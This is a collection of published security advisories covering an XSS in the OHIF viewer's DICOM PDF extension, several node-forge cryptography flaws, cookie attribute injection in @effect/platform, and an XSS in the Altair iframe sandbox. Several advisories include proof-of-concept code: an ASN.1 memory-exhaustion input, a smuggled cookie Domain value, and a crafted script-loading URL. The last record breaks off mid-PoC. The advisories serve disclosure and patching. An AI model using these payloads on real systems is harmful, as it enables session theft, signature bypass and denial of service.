items.title: [@ohif/extension-dicom-pdf] OHIF Viewers: DOM-Based Cross Site Scripting (XSS) through MIME type of document
items.summary: SummaryAn XSS (Cross-Site Scripting) vulnerability occurs when an attacker is able to inject their own JavaScript code into a web page's source, which is subsequently processed by the victim's browser. A common cause of this vulnerability is the failure to validate user-supplied data before displaying it within the vulnerable application without proper filtering. To exploit the vulnerability, an attacker must input HTML code into a vulnerable parameter containing structures that trigger the execution of JavaScript. The DOM XSS variant occurs when user-supplied data is processed by a client-side script; if this data is not handled correctly by the script itself, it becomes possible to inject additional JavaScript commands.Attacker model: Any actor who can get a DICOM object in front of a victim — email a .dcmfor local viewing, upload to a shared PACS, or operate/compromise a DICOMweb source.Preconditions: Victim opens a study whose SOP Class is Encapsulated PDF(1.2.840.10008.5.1.4.1.1.104.1) and OHIF's dicom-pdf extension renders it (default in thestandard modes).Taint pathSource — two attacker-controlled tags on the encapsulated-document instance:MIMETypeOfEncapsulatedDocument (0042,0012)EncapsulatedDocument (0042,0011) — the raw document bytesextensions/dicom-pdf/src/getSopClassHandlerModule.js:15,20 reads the MIME tag with novalidation and passes it as defaultType:const { SeriesDescription = 'PDF', MIMETypeOfEncapsulatedDocument } = instance;...const renderedUrlParams = {  instance,  tag: 'EncapsulatedDocument',  defaultType: MIMETypeOfEncapsulatedDocument || 'application/pdf',  // attacker-controlled  singlepart: 'pdf',};const renderedUrl = dataSource.retrieve.directURL(renderedUrlParams);Sink — defaultType becomes the Blob type in all three retrieval paths:Local file (no server required): extensions/default/src/DicomLocalDataSource/index.js:120-131directURL: params => {  const { instance, tag, defaultType } = params;  const value = instance[tag];  if (value instanceof Array && value[0] instanceof ArrayBuffer) {    return URL.createObjectURL(new Blob([value[0]], { type: defaultType }));  // attacker MIME  }},DICOMweb InlineBinary: extensions/default/src/utils/getDirectURL.ts:40-44 →platform/core/src/utils/b64toBlob.js:18if (value.InlineBinary) {  const blob = utils.b64toBlob(value.InlineBinary, defaultType);   // -> new Blob(..., { type: defaultType })  value.DirectRetrieveURL = URL.createObjectURL(blob);  return value.DirectRetrieveURL;}DICOMweb bulk data: extensions/default/src/utils/getDirectURL.ts:52-55return value.retrieveBulkData(options).then(arr => {  value.DirectRetrieveURL = URL.createObjectURL(new Blob([arr], { type: defaultType }));  return value.DirectRetrieveURL;});Render — extensions/dicom-pdf/src/viewports/OHIFCornerstonePdfViewport.tsx:86-92<object  data={url}                 {/* blob: URL whose stored MIME = attacker's MIMETypeOfEncapsulatedDocument */}  type="application/pdf"     {/* only a hint; overridden by the blob's own Content-Type */}  className={style}>Why it fires. A blob: URL stores the MIME type passed at new Blob(..., { type })construction. When such a URL is navigated/embedded, the browser uses the blob's storedContent-Type to choose a handler; the <object type="application/pdf"> attribute is apre-load hint, not an override. A blob created with type: 'text/html' therefore renders as anHTML document, and because blob: URLs inherit the creating page's origin, any <script> in itexecutes in the OHIF origin — with access to localStorage/sessionStorage, auth tokens,and same-origin requests to the PACS.ImpactUsers using the applications. If the application is behind authentication then session can be stolen. If on the same DNS name some other applications are hosted, they are also impacted.PatchesFixed in @ohif/extension-dicom-pdf 3.12.18, 3.13.10 and 3.14.0-beta.36 (fix: https://github.com/OHIF/Viewers/pull/6228).If you build OHIF from source, the fix first landed in tags 3.12.15, 3.13.7 and 3.14.0-beta.19.Versions 3.5 to 3.11 will not receive a fix. Upgrade to a patched 3.12, 3.13 or 3.14 version.Referenceshttps://github.com/OHIF/Viewers/security/advisories/GHSA-xwgp-w3pj-q5h3https://nvd.nist.gov/vuln/detail/CVE-2026-118670https://github.com/OHIF/Viewers/pull/6228https://github.com/OHIF/Viewers/commit/db546701bd5f2be9031c835f1de5c40aacd3dc62https://github.com/OHIF/Viewers/commit/ef0811c66cdb04ba07ffaba145cf66ce01486899https://github.com/OHIF/Viewers/commit/f0dba789a313f40fe7e8a8cbec322a8d8a491d76https://github.com/OHIF/Viewers/releases/tag/v3.12.15https://github.com/OHIF/Viewers/releases/tag/v3.13.7https://github.com/OHIF/Viewers/releases/tag/v3.14.0-beta.19https://github.com/advisories/GHSA-xwgp-w3pj-q5h3

items.title: [node-forge] Forge: Certificate signature verified with the issuer's RSA signature scheme
items.summary: SummaryWhen verifying a certificate, node-forge chose the RSA padding scheme (PKCS#1 v1.5 or RSASSA-PSS) and PSS parameters from the issuer certificate's own signature algorithm instead of the certificate being verified. A certificate labeled as signed with RSASSA-PSS could pass verifyCertificateChain() with a PKCS#1 v1.5 signature. Fixed in node-forge 1.4.1.Detailscertificate.verify(child) in lib/x509.js hashes the child's TBSCertificate with the digest of the child's signature algorithm, then calls _verifySignature() with the issuer certificate. _verifySignature() selected the padding scheme from that certificate's signatureOid and signatureParameters, so the child was verified with the issuer's own scheme rather than the one the child declares.As a result, a child certificate whose signature algorithm says RSASSA-PSS was accepted with a PKCS#1 v1.5 signature when the issuer itself was signed with PKCS#1 v1.5. The outer signatureAlgorithm field of a certificate is not covered by the signature, so an existing PKCS#1 v1.5 (SHA-256) certificate can be relabeled as RSASSA-PSS and still pass verification. The signature itself must still be made with the issuer's private key over the certificate's contents; no certificate can be forged.The same cause made correctly signed chains fail: a PKCS#1 v1.5 certificate issued by an RSASSA-PSS-signed certificate, or the reverse, was rejected.The fix verifies with the child certificate's signature scheme and parameters and the issuer's public key.PatchesFixed in node-forge 1.4.1. Certificate signatures are verified with the scheme of the certificate's own signature algorithm.WorkaroundsApplications that make decisions based on a certificate's signature algorithm can verify the signature themselves with that algorithm's scheme and the issuer's public key.Referenceshttps://www.rfc-editor.org/rfc/rfc4055#section-3 (RSASSA-PSS signature algorithm in certificates)https://www.rfc-editor.org/rfc/rfc5280#section-4.1.1.2 (Certificate signatureAlgorithm)https://cwe.mitre.org/data/definitions/347.html (CWE-347: Improper Verification of Cryptographic Signature)SeverityCVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N (3.7, Low)CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (6.3)CVSS 4.0 rates this Moderate because its integrity weighting is higher; the severity rating follows CVSS 3.1.CreditsReported by Brian Lee (@hibrian827, Georgia Tech SSLab, Team Atlanta), who also suggested the fix.Proof of conceptCreate a CA certificate signed with sha256WithRSAEncryption, and a leaf certificate whose signature algorithm fields (outer and in the TBSCertificate) are RSASSA-PSS with SHA-256/MGF1-SHA-256/salt 32, but sign the leaf's TBSCertificate with the CA key using PKCS#1 v1.5 (caKey.sign(sha256)).On 1.4.0, forge.pki.verifyCertificateChain(forge.pki.createCaStore([ca]), [leaf]) returns true, although verifying the leaf's signature with RSASSA-PSS fails. On 1.4.1 it throws "Certificate signature is invalid.".No private key is needed for the same result: take any certificate signed by the CA with sha256WithRSAEncryption and replace only its outer signatureAlgorithm (outside the signed TBSCertificate) with the RSASSA-PSS identifier above. On 1.4.0 it still verifies and reports signatureOid as RSASSA-PSS; on 1.4.1 it is rejected.Regression tests are in tests/unit/x509.js ("signature scheme of the child certificate").ImpactApplications that rely on a certificate's declared signature algorithm, for example a policy that only accepts RSASSA-PSS-signed certificates, can be given a certificate labeled RSASSA-PSS whose signature was verified as PKCS#1 v1.5. The certificate must still have been signed by the trusted issuer's key, so the identity it certifies cannot be forged. There is no confidentiality or availability impact.Referenceshttps://github.com/digitalbazaar/forge/security/advisories/GHSA-9wg5-mj3p-v49qhttps://nvd.nist.gov/vuln/detail/CVE-2026-118774https://github.com/digitalbazaar/forge/commit/c7f42614d5166a77ddf11ce174b2601b14f6956bhttps://github.com/digitalbazaar/forge/releases/tag/v1.4.1https://github.com/advisories/GHSA-9wg5-mj3p-v49q

items.title: [node-forge] Forge: Incomplete PKCS#7 padding validation in AES/DES CBC and ECB decryption
items.summary: Summarydecipher.finish() in CBC and ECB mode accepted malformed PKCS#7 padding: only the last byte was checked, against a limit of four blocks, so mismatched padding bytes, a zero count and oversized counts were accepted and up to four blocks of plaintext could be silently removed. Fixed in node-forge 1.4.1.Detailsmodes.cbc.prototype.unpad() and modes.ecb.prototype.unpad() in lib/cipherModes.js read the last decrypted byte as the PKCS#7 padding count, rejected it only if it was larger than blockSize << 2 (64 for AES, 32 for DES), and then removed that many bytes. They did not reject a count of 0 or a count larger than one block, and did not check that every padding byte equals the count, as PKCS#7 (RFC 5652 section 6.3) requires. On the Wycheproof AES-CBC-PKCS5 test vectors, 69 of 144 invalid vectors decrypted successfully.CBC and ECB without a MAC do not provide integrity: an attacker who can modify ciphertext can already make the final block decrypt to any padding. The effect of this bug is that malformed ciphertext is accepted as valid and that oversized counts silently truncate up to four blocks of plaintext. The fix does not protect against padding oracle attacks; applications that decrypt untrusted CBC data need to authenticate it (for example with an HMAC) or use AES-GCM.The fix requires a count from 1 to the block size and checks every padding byte. Data with other padding schemes that only use the last byte as the count (ANSI X.923, ISO 10126, XML Encryption) now fails to decrypt with default unpadding; set decipher.mode.unpad = false before finish() and remove such padding in application code.PatchesFixed in node-forge 1.4.1. CBC and ECB decryption requires valid PKCS#7 padding.WorkaroundsAuthenticate CBC/ECB ciphertext before decrypting it, or use AES-GCM. To check padding on 1.4.0, set decipher.mode.unpad = false and validate the padding in application code.Referenceshttps://www.rfc-editor.org/rfc/rfc5652#section-6.3 (PKCS#7 content-encryption padding)https://github.com/C2SP/wycheproof/blob/master/testvectors_v1/aes_cbc_pkcs5_test.jsonhttps://cwe.mitre.org/data/definitions/354.html (CWE-354: Improper Validation of Integrity Check Value)SeverityCVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N (3.7, Low)CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (6.3)CVSS 4.0 rates this Moderate because its integrity weighting is higher; the severity rating follows CVSS 3.1.CreditsReported by Oren Yomtov (@orenyomtov, Fireblocks), @zebbern, and Brian Lee (@hibrian827, Georgia Tech SSLab, Team Atlanta), who also suggested the fix.Proof of conceptvar forge = require('node-forge');// Wycheproof aes_cbc_pkcs5_test tcId 26: zero padding instead of PKCS#7var d = forge.cipher.createDecipher('AES-CBC',  forge.util.hexToBytes('db4f3e5e3795cc09a073fa6a81e5a6bc'));d.start({iv: forge.util.hexToBytes('23468aa734f5f0f19827316ff168e94f')});d.update(forge.util.createBuffer(  forge.util.hexToBytes('aa62606a287476777b92d8e4c4e53028')));console.log(d.finish()); // 1.4.0: true; 1.4.1: falseDirectly, unpad() on 1.4.0 also accepts a final block ending in 03 02 01 04 (removing 4 bytes) and a count of 0x20 on 16-byte blocks (removing 32 bytes).Regression tests are in tests/unit/aes.js ("PKCS#7 padding checks").ImpactApplications that decrypt AES or DES data in CBC or ECB mode and use the result of decipher.finish() to decide whether the data is valid could accept malformed ciphertext, with up to four blocks of trailing plaintext removed. This also affects PKCS#7 EncryptedData/EnvelopedData decryption, PKCS#12 and encrypted private keys. Because CBC and ECB without a MAC are malleable, the additional capability given to an attacker is small. There is no confidentiality or availability impact.Referenceshttps://github.com/digitalbazaar/forge/security/advisories/GHSA-2vgq-wchc-25w7https://nvd.nist.gov/vuln/detail/CVE-2026-118776https://github.com/digitalbazaar/forge/commit/81774ff99e2da64aec9a43591df45a360040c136https://github.com/digitalbazaar/forge/releases/tag/v1.4.1https://github.com/advisories/GHSA-2vgq-wchc-25w7

items.title: [node-forge] Forge: X.509 pathLenConstraint not enforced by verifyCertificateChain() for CA certificates without keyUsage
items.summary: Summaryforge.pki.verifyCertificateChain() enforces the pathLenConstraint of a CA certificate's basicConstraints extension only when that certificate also has a keyUsage extension. For a CA certificate with a pathLenConstraint and no keyUsage, chains with more intermediate CA certificates below it than the constraint allows are accepted. Fixed in node-forge 1.4.1.DetailsIn pki.verifyCertificateChain() (lib/x509.js), the path length check for a CA certificate was guarded by keyUsageExt !== null && 'pathLenConstraint' in bcExt. The keyUsage test was originally a proxy for "a basicConstraints extension exists". Since node-forge 1.4.0 (GHSA-2328-f5f3-gj25), basicConstraints is required for every certificate that reaches this check, so the only remaining effect of the guard is to skip pathLenConstraint enforcement for CA certificates without keyUsage.RFC 5280 permits CA certificates without keyUsage, and path length processing in section 6.1.4 (l)-(m) does not depend on keyUsage; section 4.2.1.9 defines pathLenConstraint as part of basicConstraints only. For example, with a trusted root, an intermediate CA with pathLenConstraint=0 and no keyUsage, a sub-CA issued by that intermediate, and a leaf issued by the sub-CA, node-forge accepts the chain. It correctly rejects the same chain when the intermediate has keyUsage.The fix checks pathLenConstraint whenever the basicConstraints extension is present, regardless of keyUsage (based on PR #1142).PatchesFixed in node-forge 1.4.1. pathLenConstraint is now enforced for CA certificates without a keyUsage extension.WorkaroundsNone in node-forge itself. Applications that pass an options.verify callback to pki.verifyCertificateChain() (or verify to forge.tls.createConnection()) can reject chains in which a CA certificate at depth d has basicConstraints.pathLenConstraint < d - 1. Re-issuing constrained CA certificates with a keyUsage extension that includes keyCertSign also restores enforcement.ReferencesRFC 5280, sections 4.2.1.9 and 6.1.4: https://www.rfc-editor.org/rfc/rfc5280#section-6.1.4Related: GHSA-2328-f5f3-gj25 / CVE-2026-33896 (basicConstraints bypass, fixed in 1.4.0)https://github.com/digitalbazaar/forge/pull/1142SeverityCVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (5.9, Moderate)CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (8.2)CVSS 4.0 weights the attack preconditions differently and scores this higher; the severity rating follows CVSS 3.1.Credits@offset, @eddieran, also reported independently by Zion Boggan (@zionboggan) and @EchoSkorJjj.Proof of conceptBuild the chain root <- int <- subCA <- leaf, where int has basicConstraints cA=true, pathLenConstraint=0 and no keyUsage, subCA is a CA certificate issued by int, and leaf is issued by subCA:var caStore = forge.pki.createCaStore([root]);forge.pki.verifyCertificateChain(caStore, [leaf, subCA, int]);// <= 1.4.0: true (pathLenConstraint=0 ignored)// 1.4.1: throws "Certificate basicConstraints pathLenConstraint violated."The same chain is rejected on <= 1.4.0 when int also has a keyUsage extension with keyCertSign. The fix adds regression tests in tests/unit/x509.js and the reporter's PoC as tests/pocs/ghsa-h46v-rmh6-fq4f.js.ImpactApplications that verify certificate chains with forge.pki.verifyCertificateChain(), including TLS peer certificate verification in forge.tls, are affected when a CA they trust (directly or through a chain) has a pathLenConstraint and no keyUsage extension.Exploitation requires such a path-length-constrained CA certificate that chains to a root the application trusts. The attacker must either hold that CA's private key or obtain a CA certificate from it. That CA can then create subordinate CAs, and certificates issued by those subordinate CAs are accepted by pki.verifyCertificateChain(). Public web PKI CA certificates normally include keyUsage. Private PKIs whose CA certificates were created without keyUsage are most likely to be affected.Referenceshttps://github.com/digitalbazaar/forge/security/advisories/GHSA-h46v-rmh6-fq4fhttps://nvd.nist.gov/vuln/detail/CVE-2026-119189https://github.com/digitalbazaar/forge/commit/696db92348623e88cc63c35f0a89ede481d55ad0https://github.com/digitalbazaar/forge/releases/tag/v1.4.1https://github.com/advisories/GHSA-h46v-rmh6-fq4f

items.title: [node-forge] Forge: ASN.1 resource exhaustion via BIT STRING decoding in asn1.fromDer
items.summary: Summaryasn1.fromDer() decodes the contents of BIT STRINGs as ASN.1 by default. That decode ignored the maxDepth recursion limit (an incomplete fix of CVE-2025-66031) and also decoded nested BIT STRINGs, keeping a full copy of the decoded contents at each level, so small crafted DER or PEM inputs (certificates, keys, PKCS structures) use excessive CPU time and memory and can abort the Node.js process. Fixed in node-forge 1.4.1.Detailsasn1.fromDer() attempts by default to decode the contents of primitive BIT STRINGs as ASN.1 (decodeBitStrings, default true). Two flaws in that decode in lib/asn1.js allow resource exhaustion:_fromDer() started the BIT STRING decode with a new options object, {strict: true, decodeBitStrings: true}, that did not include maxDepth. Inside that decode the depth check compared against undefined and never triggered, so the recursion limit added for CVE-2025-66031 (GHSA-554w-wpv2-vw27) was not enforced for anything below a decoded BIT STRING. Both the global asn1.maxDepth (default 256) and the per-call maxDepth option were ignored there. Errors in this speculative decode, including stack overflows, are caught and the contents kept as raw bytes, so deep nesting is parsed instead of rejected. This is an incomplete fix of CVE-2025-66031.BIT STRINGs nested inside decoded BIT STRING contents were decoded as well, and asn1.create() gives each decoded BIT STRING a deep copy of its decoded contents (obj.original, used by toDer() to detect changes). Memory use therefore grows quadratically with the nesting depth, even within the default depth limit.No specification is violated; the parser lacks a resource limit.The fix passes maxDepth to the BIT STRING decode, and decodes BIT STRING contents with decodeBitStrings: false, so only one level of BIT STRING contents is decoded. Contents that would exceed the limit, and BIT STRINGs inside decoded BIT STRING contents, are kept as undecoded BIT STRING values; toDer() writes their original bytes. Common structures such as SubjectPublicKeyInfo only use one level. Code that relied on nested decoding can decode the inner value explicitly with asn1.fromDer().PatchesFixed in node-forge 1.4.1. The maxDepth limit now applies to ASN.1 decoded from BIT STRING contents, and only one level of BIT STRING contents is decoded.WorkaroundsCode that calls forge.asn1.fromDer() directly and does not need encapsulated BIT STRING contents decoded can pass {decodeBitStrings: false}. This changes the parsed structure. The higher-level PKI, PKCS and TLS APIs do not expose this option and rely on the decoded form. For those, the only remedy is upgrading.ReferencesCVE-2025-66031 / https://github.com/digitalbazaar/forge/security/advisories/GHSA-554w-wpv2-vw27 (ASN.1 Unbounded Recursion, fixed in 1.3.2)https://cwe.mitre.org/data/definitions/674.html (CWE-674: Uncontrolled Recursion)https://cwe.mitre.org/data/definitions/400.html (CWE-400: Uncontrolled Resource Consumption)SeverityCVSS 3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (7.5, High)CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (8.7)Both versions rate this High. The severity rating follows CVSS 3.1.CreditsReported by Ethan Kim (cremit.io), Youngjoon Kim (@acorn421) and Brian Lee (@hibrian827) of Georgia Tech SSLab, @arpitjain099, and Mike Read.Proof of conceptInput shape: n nested primitive BIT STRINGs (03 <len> 00 <inner>) around a NULL. For example:var asn1 = forge.asn1;var obj = asn1.create(asn1.Class.UNIVERSAL, asn1.Type.NULL, false, '');for(var i = 0; i < 2000; ++i) {  obj = asn1.create(asn1.Class.UNIVERSAL, asn1.Type.BITSTRING, false, [obj]);}var der = asn1.toDer(obj).getBytes(); // 9,886 bytesasn1.fromDer(der, {maxDepth: 10});On 1.4.0 (Node.js 24) this parses all 2,000 levels despite maxDepth: 10, taking about 0.5-1 s and 600 MB. One SEQUENCE holding 20 such chains (about 198 KB) aborts a process with the default heap with "FATAL ERROR: JavaScript heap out of memory", which the application cannot catch. Within the depth limit, 80 chains of 254 levels (92 KB) still use about 0.8 GB. The same inputs wrapped as PEM reach pki.publicKeyFromPem() and pki.certificateFromPem() (a 20 KB certificate PEM used 1.3 GB before being rejected). On 1.4.1 these inputs parse in a few milliseconds and about 55-65 MB.Regression tests in tests/unit/asn1.js: "should limit depth in decoded BIT STRINGs (default)", "should limit depth in decoded BIT STRINGs (maxDepth)", "should only decode one level of BIT STRINGs" and "should not decode BIT STRINGs in many BIT STRINGs".ImpactA remote, unauthenticated attacker can supply a small DER or PEM structure with nested BIT STRINGs to any API that parses with asn1.fromDer() using default options. This includes pki.certificateFromPem(), pki.publicKeyFromPem(), the PKCS#7, PKCS#8 and PKCS#12 loaders, and server certificates received by forge's TLS client. Parsing such input consumes excessive CPU time and memory before the structure is rejected. On Node.j

items.title: [node-forge] Forge: RSA PKCS#1 v1.5 signature forgery via non-canonical DigestInfo encoding
items.summary: SummaryRSASSA-PKCS1-v1_5 signature verification (publicKey.verify() with the default scheme, also used by X.509 certificate and PKCS#7 verification) accepted non-canonical BER encodings of the DigestInfo, such as NULL parameters with content and non-minimal lengths. These leave attacker-controlled bytes inside an accepted DigestInfo, which allows signatures to be forged without the private key for RSA keys with a low public exponent (e=3). Fixed in node-forge 1.4.1.DetailsIn lib/rsa.js, key.verify() with the default RSASSA-PKCS1-V1_5 scheme removes the padding, parses the recovered DigestInfo with the lenient BER parser asn1.fromDer() and checks its structure with asn1.validate() against digestInfoValidator. Neither requires a canonical DER encoding, so verification accepted, among others:NULL parameters with content bytes (e.g. 05 40 <64 bytes>)non-NULL or constructed values in the parameters positionnon-minimal (long form) and indefinite lengthsnon-canonical OID encodings (padded subidentifiers, trailing bytes)These leave attacker-controlled bytes inside an accepted DigestInfo. For RSA keys with a low public exponent (e=3) this allows signatures to be forged without the private key (BERserk / Bleichenbacher-style forgery, see CVE-2014-1568).RFC 8017 section 8.2.2 verifies a signature by encoding the expected EMSA-PKCS1-v1_5 message and comparing it with the recovered one; section 9.2 defines the DigestInfo encoding.The fix adds _encodeDigestInfo(), which DER-encodes the expected DigestInfo from the digest algorithm OID and the digest (with and without NULL parameters). Verification now requires the recovered DigestInfo to match one of these encodings byte for byte. The same change fixes GHSA-2g46-22mc-6gwp (CVE-2026-85393).PatchesFixed in node-forge 1.4.1. Verification now re-encodes the expected DigestInfo and requires a byte-for-byte match (RFC 8017 section 8.2.2).WorkaroundsDo not use RSA keys with a low public exponent (e=3) for signature verification.Referenceshttps://www.rfc-editor.org/rfc/rfc8017#section-8.2.2https://www.rfc-editor.org/rfc/rfc8017#section-9.2CVE-2026-85393 / GHSA-2g46-22mc-6gwp (related, same fix)CVE-2026-33894 / https://github.com/digitalbazaar/forge/security/advisories/GHSA-ppp5-5v6c-4jwphttps://www.cve.org/CVERecord?id=CVE-2014-1568 (BERserk)SeverityCVSS 3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (7.5, High)CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (8.2)Both versions rate this High. The severity rating follows CVSS 3.1.CreditsIndependently reported by Oren Yomtov (@orenyomtov, Fireblocks), Bronson Yen (Calif.io, in collaboration with Claude and Anthropic Research), Kamil Hałajda, @pzartech, @antonlissone and @Brechard.Proof of conceptDigestInfo encodings accepted before 1.4.1 (SHA-256; OID = 06 09 60 86 48 01 65 03 04 02 01, H = the 32-byte digest):NULL parameters with content:  30 33 30 0F <OID> 05 02 BE EF 04 20 <H>non-minimal DigestInfo length: 30 81 31 30 0D <OID> 05 00 04 20 <H>(canonical form:               30 31 30 0D <OID> 05 00 04 20 <H>)Long-form lengths are accepted the same way for the DigestAlgorithm, OID, NULL and digest fields. A signature whose EMSA-PKCS1-v1_5 block (00 01 FF..FF 00 || DigestInfo) contains such an encoding verified as valid: publicKey.verify(digest, signature) returned true. Content bytes in the NULL parameters (reports used e.g. 05 40 <64 bytes>) and similar slack give an attacker room to construct a forged signature for an e=3 key. With 1.4.1, verification throws "ASN.1 object does not contain a valid RSASSA-PKCS1-v1_5 DigestInfo value."Regression tests: tests/unit/rsa.js, "canonical DigestInfo checks". They use an e=1 key, so the signature equals the encoded block, with one test per non-canonical shape (also indefinite length, constructed and non-NULL parameters, padded OID subidentifiers) and two tests that the canonical encodings with and without NULL parameters still verify. Included in the 1.4.1 release.ImpactApplications that verify RSASSA-PKCS1-v1_5 signatures with node-forge: publicKey.verify() with the default scheme, and X.509 certificate and PKCS#7 signature verification, which use it. If the verifying RSA public key has a low public exponent (e=3), an attacker can forge a signature that verifies as valid, without the private key. Only keys with a small public exponent such as e=3 are practically affected.Referenceshttps://github.com/digitalbazaar/forge/security/advisories/GHSA-2g46-22mc-6gwphttps://github.com/digitalbazaar/forge/security/advisories/GHSA-6qrw-m8cv-hcxfhttps://github.com/digitalbazaar/forge/commit/2bce9d477a2ff436e86ff9694ae999f1552aa2bbhttps://github.com/digitalbazaar/forge/releases/tag/v1.4.1https://github.com/advisories/GHSA-6qrw-m8cv-hcxf

items.title: [@effect/platform] Effect: Cookie attribute injection via domain, path, and name fields in @effect/platform makeCookie()
items.summary: ImpactThe name, domain, and path fields of makeCookie() were validated with a regex that allows ;, the attribute separator in Set-Cookie headers. Because serializeCookie() writes those fields verbatim, a caller who passes untrusted input into any of them can append arbitrary attributes to the header.For example, a domain of "legit.com; Domain=.parent.tld" serializes to session=token; Domain=legit.com; Domain=.parent.tld. RFC 6265 §5.3 takes the last occurrence, so the injected domain wins and the cookie widens to the parent domain. The same trick sets SameSite=None or Max-Age when the caller has not set those options itself.The value field is unaffected: it passes through encodeURIComponent, which encodes ;. CR and LF are rejected by the existing regex, so header splitting is not possible.PatchesFixed in #6763 (v4) and #6765 (v3): the shared regex is split into per-field validators that reject ;, and serializeCookie() now validates before writing the header.WorkaroundsDo not pass user input into name, domain, or path; set them from application constants.Referenceshttps://github.com/Effect-TS/effect/security/advisories/GHSA-chp3-j5qr-2vfrhttps://nvd.nist.gov/vuln/detail/CVE-2026-115779https://github.com/Effect-TS/effect/pull/6763https://github.com/Effect-TS/effect/pull/6765https://github.com/Effect-TS/effect/commit/4a57af24011db1d66e947289d2f7ffc2074696d2https://github.com/Effect-TS/effect/commit/5859b373b9be04d5037a594196b4743ad80379bdhttps://github.com/Effect-TS/effect/releases/tag/@effect/platform@0.97.1https://github.com/Effect-TS/effect/releases/tag/effect@4.0.0-beta.103https://github.com/advisories/GHSA-chp3-j5qr-2vfr

items.title: [altair-static] Altair: DOM-based XSS via attacker-controlled script URLs in the iframe sandbox
items.summary: SummaryAltair 8.5.7 accepts plugin configuration directly from the iframe-sandbox query string.When plugin_sandbox_opts contains type: "scripts" and an attacker-controlled URL in scriptUrls, the sandbox page creates a classic <script src="..."> element and loads the supplied script.In the intended plugin flow, this page runs inside an <iframe sandbox="allow-scripts"> without allow-same-origin, giving plugin code an opaque origin. However, if a victim opens the crafted sandbox URL directly, that iframe isolation is absent and the attacker-controlled script executes in the origin serving Altair, resulting in DOM-based cross-site scripting (XSS) / arbitrary JavaScript execution in the Altair hosting origin.Exploitation requires the victim to open a crafted URL.DetailsThe sandbox reads its configuration directly from window.location.search.In packages/altair-iframe-sandbox/src/main.ts:const searchParams = new URLSearchParams(window.location.search);const sandboxType = searchParams.get('sandbox_type');switch (sandboxType) {  case 'plugin':    handlePluginSandbox();    break;}handlePluginSandbox() then parses plugin_sandbox_opts:const searchParams = new URLSearchParams(window.location.search);const pluginSandboxOptsStr = searchParams.get('plugin_sandbox_opts');const pluginSandboxOpts = pluginSandboxOptsStr  ? (JSON.parse(pluginSandboxOptsStr) as PluginParentWorkerOptions)  : undefined;The relevant validation only checks the plugin type:if (pluginSandboxOpts.type !== 'scripts') {  throw new Error('Invalid plugin option type provided!');}Values from scriptUrls are then passed to injectScript():if (pluginSandboxOpts.scriptUrls) {  for (const script of pluginSandboxOpts.scriptUrls) {    await injectScript(script);  }}The sink in packages/altair-core/src/utils/inject.ts is:const script = document.createElement('script');script.type = 'text/javascript';script.src = url;head.appendChild(script);The intended parent flow relies on browser iframe sandboxing:// NOTE: Don't add allow-same-origin to the sandbox attribute!iframe.sandbox.add('allow-scripts');Direct navigation to the sandbox URL does not have this parent iframe sandbox, so the injected script runs in the normal hosting origin.The official middleware also clears CSP for paths identified as iframe-sandbox. This is not the root cause, but reduces the chance that a deployment-level CSP will block attacker-controlled external scripts when the default middleware behavior is used.PoCThe following PoC is intentionally benign and demonstrates JavaScript execution in the Altair hosting origin.Create a local Altair deploymentmkdir altair-local-testcd altair-local-testnpm init -ynpm i express@5.2.1 altair-express-middleware@8.5.7 graphql@17.0.2 graphql-http@1.23.0Create server.js:const express = require("express");const { altairExpress } = require("altair-express-middleware");const { createHandler } = require("graphql-http/lib/use/express");const { buildSchema } = require("graphql");const app = express();const schema = buildSchema(`  type Query {    hello: String  }`);const root = {  hello: () => "world",};app.all(  "/api/graphql",  createHandler({    schema,    rootValue: root,  }));app.use(  "/graphql",  altairExpress({    endpointURL: "/api/graphql",    initialQuery: "{ hello }",  }));app.listen(4000, () => {  console.log("Altair UI: http://localhost:4000/graphql/");  console.log("Sandbox:   http://localhost:4000/graphql/iframe-sandbox/");});Run:node server.jsHost a benign scriptHost the following as poc.js on a domain you control:document.body.textContent = "";const h1 = document.createElement("h1");h1.textContent = "Altair iframe-sandbox PoC";const p = document.createElement("p");p.textContent = "Script executed in: " + window.location.origin;document.body.append(h1, p);Build the crafted URLCreate build-poc-url.js:const opts = {  id: "local-poc",  type: "scripts",  scriptUrls: ["http://127.0.0.1:8000/poc.js"],  styleUrls: []};const url =  "http://localhost:4000/graphql/iframe-sandbox/" +  "?sandbox_type=plugin&plugin_sandbox_opts=" +  encodeURIComponent(JSON.stringify(opts));console.log(url);Run:node build-poc-url.jsThis prints a fully encoded URL similar to:http://localhost:4000/graphql/iframe-sandbox/?sandbox_type=plugin&plugin_sandbox_opts=%7B%22id%22%3A%22local-poc%22%2C%22type%22%3A%22scripts%22%2C%22scriptUrls%22%3A%5B%22http%3A%2F%2F127.0.0.1%3A8000%2Fpoc.js%22%5D%2C%22styleUrls%22%3A%5B%5D%7DOpen the crafted URLhttp://localhost:4000/graphql/iframe-sandbox/?sandbox_type=plugin&plugin_sandbox_opts=%7B%22id%22%3A%22local-poc%22%2C%22type%22%3A%22scripts%22%2C%22scriptUrls%22%3A%5B%22http%3A%2F%2F127.0.0.1%3A8000%2Fpoc.js%22%5D%2C%22styleUrls%22%3A%5B%5D%7DSome deployments also accept:http://localhost:4000/graphql/iframe-sandbox/index.html?sandbox_type=plugin&plugin_sandbox_opts=%7B%22id%22%3A%22local-poc%22%2C%22type%22%3A%22scripts%22%2C%22scriptUrls%22%3A%5B%22http%3A%2F%2F127.0.0.1%3A8000%2Fpoc.js%22%5D%2C%22styleUrls%22%3A%5B%5D%7DThe page creates:<script type

